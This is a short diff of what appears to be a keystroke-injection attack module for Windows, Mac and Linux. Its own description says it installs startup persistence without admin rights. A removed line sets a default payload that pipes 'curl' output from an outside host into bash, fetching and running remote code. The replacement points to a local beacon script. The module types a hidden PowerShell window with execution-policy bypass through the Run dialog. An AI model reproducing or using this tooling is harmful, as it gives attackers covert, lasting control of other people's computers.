@@ -14,13 +14,13 @@ DESCRIPTION Install user-level startup persistence (no admin required) on Window
 CATEGORY post
 PLATFORMS WIN,MAC,LINUX
 
-OPTION PAYLOAD_CMD curl -s http://10.0.0.1/beacon | bash "Command to execute at startup/login"
+OPTION PAYLOAD_CMD /tmp/beacon.sh "Command to execute at startup/login"
 
 PLATFORM WIN
   # Open hidden PowerShell via Run dialog
   DELAY 500
   GUI r
-  DELAY 300
+  DELAY 500
   STRING powershell -w h -nop -ep bypass
   ENTER
   DELAY 1000
